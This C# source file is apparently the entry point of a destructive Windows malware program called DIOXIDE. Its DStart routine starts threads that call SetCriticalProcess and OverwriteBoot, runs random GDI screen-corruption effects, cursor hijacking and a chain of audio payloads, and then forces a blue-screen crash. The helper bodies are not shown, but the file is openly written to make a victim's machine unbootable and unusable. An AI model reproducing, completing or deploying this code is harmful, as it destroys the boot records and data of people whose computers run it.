using System;
using System.Threading;
using static DIOXIDE.run_payloads;

namespace DIOXIDE
{
    class run_payloads
    {
        public unsafe static void DStart()
        {
            payloads payloads = new payloads();
            destruction destruction = new destruction();

            new Thread(new ThreadStart(payloads.Clicker)).Start();
            new Thread(new ThreadStart(destruction.SetCriticalProcess)).Start();
            new Thread(new ThreadStart(destruction.OverwriteBoot)).Start();

            PStart();

            destruction.BSOD();

            Environment.Exit(0);
        }
        public static void PStart()
        {
            new Thread(new ThreadStart(randGDIPayload_run)).Start();
            AudioPayload_run();
            return;
        }

        private static void randGDIPayload_run()
        {
            payloads p = new payloads();
            int True = 1;
            new Thread(new ThreadStart(p.CursorDraw)).Start();
            new Thread(new ThreadStart(p.cursor_movement)).Start();
            for (; ; )
            {
                Random rnad = new Random();

                int number = rnad.Next(1, 14);

                if (number == 1)
                {
                    new Thread(new ThreadStart(p.gdi2)).Start();
                    Thread.Sleep(20000);
                    p.gdi2_cancel = True;
                }

                if (number == 2)
                {
                    new Thread(new ThreadStart(p.gdi3)).Start();
                    Thread.Sleep(20000);
                    p.gdi3_cancel = True;
                }

                if (number == 3)
                {
                    new Thread(new ThreadStart(p.gdi2)).Start();
                    new Thread(new ThreadStart(p.gdi3)).Start();
                    Thread.Sleep(20000);
                    p.gdi2_cancel = True;
                    p.gdi3_cancel = True;
                }

                if (number == 4)
                {
                    new Thread(new ThreadStart(p.gdi4)).Start();
                    Thread.Sleep(20000);
                    p.gdi4_cancel = True;
                }

                if (number == 5)
                {
                    new Thread(new ThreadStart(p.gdi5)).Start();
                    Thread.Sleep(20000);
                    p.gdi5_cancel = True;
                }

                if (number == 6)
                {
                    new Thread(new ThreadStart(p.gdi6)).Start();
                    new Thread(new ThreadStart(p.gdi7)).Start();
                    Thread.Sleep(20000);
                    p.gdi6_cancel = True;
                    p.gdi7_cancel = True;
                }

                if (number == 7)
                {
                    new Thread(new ThreadStart(p.gdi8)).Start();
                    Thread.Sleep(20000);
                    p.gdi8_cancel = True;
                }
                if (number == 8)
                {
                    new Thread(new ThreadStart(p.gdi9)).Start();
                    Thread.Sleep(20000);
                    p.gdi9_cancel = True;
                }
                if (number == 9)
                {
                    new Thread(new ThreadStart(p.gdi10)).Start();
                    Thread.Sleep(20000);
                    p.gdi10_cancel = True;
                }
                if (number == 10)
                {
                    new Thread(new ThreadStart(p.gdi11)).Start();
                    Thread.Sleep(20000);
                    p.gdi11_cancel = True;
                }
                if (number == 11)
                {
                    new Thread(new ThreadStart(p.gdi12)).Start();
                    Thread.Sleep(20000);
                    p.gdi12_cancel = True;
                }
                if (number == 12)
                {
                    new Thread(new ThreadStart(p.gdi13)).Start();
                    Thread.Sleep(20000);
                    p.gdi13_cancel = True;
                }
                if (number == 13)
                {
                    new Thread(new ThreadStart(p.gdi14)).Start();
                    Thread.Sleep(20000);
                    p.gdi14_cancel = True;
                }
                if (number == 14)
                {
                    new Thread(new ThreadStart(p.gdi15_1)).Start();
                    new Thread(new ThreadStart(p.gdi15_2)).Start();
                    new Thread(new ThreadStart(p.gdi15_3)).Start();
                    new Thread(new ThreadStart(p.gdi15_4)).Start();
                    Thread.Sleep(20000);
                    p.gdi15_1_cancel = True;
                    p.gdi15_2_cancel = True;
                    p.gdi15_3_cancel = True;
                    p.gdi15_4_cancel = True;
                }
            }
        }
        private static void AudioPayload_run()
        {
            payloads p = new payloads();
            p.Sound1();
            p.Sound2();
            p.Sound3();
            p.Sound4();
            p.Sound5();
            p.Sound6();
            p.Sound7();
            p.Sound8();
            p.Sound9();
            p.Sound10();
            p.Sound11();
            p.Sound12();
            p.Sound13();
            p.Sound14();
            p.Sound15();
            p.Sound16();
            p.FreezeSound();
            return;
        }
    }
}